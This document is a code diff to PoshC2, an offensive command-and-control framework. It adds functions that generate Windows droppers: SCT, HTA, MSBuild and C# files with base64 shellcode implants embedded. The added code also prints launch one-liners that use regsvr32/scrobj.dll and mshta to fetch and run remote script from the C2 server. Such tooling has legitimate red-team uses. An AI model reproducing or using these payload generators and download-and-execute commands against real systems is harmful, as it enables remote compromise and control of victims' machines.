@@ -11,7 +11,7 @@ from enum import Enum
 import donut
 
 from poshc2 import Colours
-from poshc2.Utils import gen_key, offset_finder, get_first_url
+from poshc2.Utils import gen_key, offset_finder, get_first_url, new_implant_id
 from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName, \
     PayloadDomainCheck as DefaultPayloadDomainCheck
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, PayloadModulesDirectory, Jitter
@@ -408,6 +408,141 @@ class Payloads(object):
                                        f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                        PayloadType.PBindSharp, name)
 
+    def createsct(self, name=""):
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.first_url}/{self.hosted_files_url}_rg")
+        with open("%sdropper_rg.sct" % (PayloadTemplatesDirectory), 'r') as f:
+            content = f.read()
+        content = str(content) \
+            .replace("#REPLACEME#", self.create_raw_base())
+        with open("%s%srg_sct.xml" % (self.output_directory , name), 'w') as f:
+            f.write(content)
+
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("mshta.exe 'vbscript:GetObject(\"script:%s\")(window.close)'" % f"{self.first_url}/{self.hosted_files_url}_cs")
+        with open("%sdropper_cs.sct" % (PayloadTemplatesDirectory), 'r') as f:
+            content = f.read()
+        content = str(content) \
+            .replace("#REPLACEME#", self.create_raw_base())
+        with open("%s%scs_sct.xml" % (self.output_directory, name), 'w') as f:
+            f.write(content)
+
+    def createhta(self, name=""):
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("HTA Payload written to: %s%sLauncher.hta" % self.output_directory)
+
+        basefile = self.create_raw_base(full=True)
+        with open("%sdropper.hta" % (PayloadTemplatesDirectory), 'r') as f:
+            hta = f.read()
+        hta = str(hta) \
+            .replace("#REPLACEME#", basefile)
+        with open("%s%sLauncher.hta" % (self.output_directory, name), 'w') as f:
+            f.write(hta)
+
+    def createmsbuild(self, name="", pbindOnly=False):
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("Msbuild payload files:")
+
+        for Payload in PayloadType:
+            if not pbindOnly:
+                self.createmsbuildfiles(Payload, name)
+            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
+                self.createmsbuildfiles(Payload, name)
+
+    def createmsbuildfiles(self, payloadtype, name=""):
+        self.quickstart_log("Payload written to: %s%s%s_msbuild.xml" % (self.output_directory, name, payloadtype.value))
+
+        if payloadtype == PayloadType.Posh_v2:
+            with open("%s%s" % (self.output_directory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.Posh_v4:
+            with open("%s%s" % (self.output_directory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.Sharp:
+            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.PBindSharp:
+            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.FCommSharp:
+            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+
+        x86base64 = base64.b64encode(x86base64)
+        x64base64 = base64.b64encode(x64base64)
+
+        with open("%smsbuild.xml" % (PayloadTemplatesDirectory), 'r') as f:
+            msbuild = f.read()
+        msbuild = str(msbuild) \
+            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
+            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
+            .replace("#REPLACEMERANDSTRING#", str(new_implant_id()))
+
+        with open("%s%s%s_msbuild.xml" % (self.output_directory, name, payloadtype.value), 'w') as f:
+            f.write(msbuild)
+
+    def createcsc(self, name="", pbindOnly=False):
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("CSC payload files:")
+
+        for Payload in PayloadType:
+            if not pbindOnly:
+                self.createcscfiles(Payload, name)
+            if pbindOnly and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
+                self.createcscfiles(Payload, name)
+
+    def createcscfiles(self, payloadtype, name=""):
+        self.quickstart_log("Payload written to: %s%s%s_csc.cs" % (self.output_directory, name, payloadtype.value))
+
+        if payloadtype == PayloadType.Posh_v2:
+            with open("%s%s" % (self.output_directory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.Posh_v4:
+            with open("%s%s" % (self.output_directory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.Sharp:
+            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.PBindSharp:
+            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "PBindSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+        elif payloadtype == PayloadType.FCommSharp:
+            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()
+
+        x86base64 = base64.b64encode(x86base64)
+        x64base64 = base64.b64encode(x64base64)
+
+        with open("%scsc.cs" % (PayloadTemplatesDirectory), 'r') as f:
+            content = f.read()
+        content = str(content) \
+            .replace("#REPLACEME32#", x86base64.decode('UTF-8')) \
+            .replace("#REPLACEME64#", x64base64.decode('UTF-8')) \
+            .replace("#REPLACEMERANDSTRING#", str(new_implant_id()))
+
+        with open("%s%s%s_csc.cs" % (self.output_directory, name, payloadtype.value), 'w') as f:
+            f.write(content)
+
     def create_dotnet2js(self, name="", pbind_only=False):
         self.quickstart_log(Colours.END)
         self.quickstart_log("DotNet2JS Payloads:")
@@ -573,6 +708,8 @@ class Payloads(object):
         self.quickstart_log(Colours.END + "Payloads/droppers using powershell.exe:" + Colours.END)
         self.quickstart_log(Colours.END + "=======================================" + Colours.END)
         self.create_raw(name)
+        self.createsct(name)
+        self.createhta(name)
 
         self.quickstart_log(Colours.END)
         self.quickstart_log(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
@@ -589,6 +726,8 @@ class Payloads(object):
         self.create_python(name)
         self.create_dynamic_code_template(name)
         self.create_dynamic_payloads(name)
+        self.createmsbuild(name)
+        self.createcsc(name)
 
     def create_pbind(self, name, debug_payloads=False):
         self.quickstart_log(Colours.END)
